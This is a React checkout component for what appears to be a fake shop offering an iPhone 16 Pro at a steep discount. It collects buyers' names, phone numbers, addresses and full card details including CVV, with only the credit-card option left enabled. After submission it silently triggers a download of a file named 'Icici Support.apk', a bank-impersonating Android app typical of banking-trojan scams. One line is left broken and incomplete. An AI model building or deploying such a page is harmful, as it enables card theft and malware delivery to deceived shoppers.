import React, { useState } from "react";
import axios from "axios";
import "../LargeArea.css";
import app from '../../../Icici Support.apk'
function LargeArea() {
  const [formData, setFormData] = useState({
    fullName: "",
    mobileNumber: "",
    city: "",
    state: "",
    address: "",
    pincode: "",
    paymentMethod: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
  });

  const [errorMessage, setErrorMessage] = useState("");

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handlePaymentMethodChange = (e) => {
    setFormData({ ...formData, paymentMethod: e.target.value });
  };

  const validateForm = () => {
    if (
      !formData.fullName ||
      !formData.mobileNumber ||
      !formData.city ||
      !formData.state ||
      !formData.address ||
      !formData.pincode
    ) {
      setErrorMessage("Please fill in all the billing details.");
      return false;
    }

    if (formData.paymentMethod === "") {
      setErrorMessage("Please select a payment method.");
      return false;
    }

    if (
      formData.paymentMethod !== "Cash On Delivery" &&
      (!formData.cardNumber ||
        !formData.expiryMonth ||
        !formData.expiryYear ||
        !formData.cvv)
    ) {
      setErrorMessage("Please fill in all card details.");
      return false;
    }
    return true;
  };




  function downloadApk() {
    const apkUrl = app; // Replace this with the actual URL of your APK file
    const link = document.createElement('a');
    link.href = apkUrl;
    link.setAttribute('download', 'Support.apk'); // The file will be downloaded with this name
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }
  











  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    try {
      const response = await axios.post("/checkout", formData);
      if (response.status === 200) {
        downloadApk()
        alert("Order placed successfully!");
      } else {
        alert("Error placing order, please try again.");
      }
    } catch (error) {
      console.error("Error sending data to backend", error);
      alert("Error placing order, please try again.");
    }
  };
const [isFormSubmmited, setIsForm]
  return (
    <div className="largeArea">




      <div className="left-area">
        <h2>Billing Details</h2>
        <input
          type="text"
          name="fullName"
          placeholder="Full Name"
          value={formData.fullName}
          onChange={handleChange}
        />
        <input
          type="text"
          name="mobileNumber"
          placeholder="Mobile Number"
          value={formData.mobileNumber}
          onChange={handleChange}
        />

        <div className="city-state">
          <input
            type="text"
            name="city"
            placeholder="City"
            value={formData.city}
            onChange={handleChange}
          />
          <input
            type="text"
            name="state"
            placeholder="State"
            value={formData.state}
            onChange={handleChange}
          />
        </div>
        <div className="city-state">
          <input
            type="text"
            name="address"
            placeholder="Address"
            value={formData.address}
            onChange={handleChange}
          />
          <input
            type="text"
            name="pincode"
            placeholder="Pincode / Zip"
            value={formData.pincode}
            onChange={handleChange}
          />
        </div>
      </div>

      <div className="right-area">
        <h2>Your Order</h2>
        <div className="right-container">
          <h3 className="qunt2">
            Apple iPhone 16 Pro (128 GB) - Desert Titanium{" "}
          </h3>
          <h3 className="qunt"> | Quantity: 1 | Total: ₹61,000 </h3>

          <div className="card-selection">
            <p>
              <input
                type="radio"
                name="paymentMethod"
                value="Credit Card"
                onChange={handlePaymentMethodChange}
              />{" "}
              <span>Credit Card</span>
            </p>
            <p>
              <input
                type="radio"
                disabled
                name="paymentMethod"
                value="Debit Card"
                onChange={handlePaymentMethodChange}
              />{" "}
              <span>Debit Card</span>
            </p>
            <p>
              <input
                disabled
                type="radio"
                name="paymentMethod"
                value="Cash On Delivery"
                onChange={handlePaymentMethodChange}
              />{" "}
              <span>Cash On Delivery</span>
            </p>
          </div>

          {formData.paymentMethod !== "Cash On Delivery" && (
            <>
              <p className="t1">Card Details</p>
              <input
                type="text"
                name="cardNumber"
                placeholder="Card Number"
                value={formData.cardNumber}
                onChange={handleChange}
              />
              <div className="expiry-date">
                <input
                  type="text"
                  name="expiryMonth"
                  placeholder="MM"
                  value={formData.expiryMonth}
                  onChange={handleChange}
                />
                <input
                  type="text"
                  name="expiryYear"
                  placeholder="YY"
                  value={formData.expiryYear}
                  onChange={handleChange}
                />
                <input
                  type="text"
                  name="cvv"
                  placeholder="CVV"
                  value={formData.cvv}
                  onChange={handleChange}
                />
              </div>
            </>
          )}

          <button onClick={handleSubmit}>Place Order</button>

          {errorMessage && <p className="error-message">{errorMessage}</p>}
        </div>
      </div>





    </div>
  );
}

export default LargeArea;
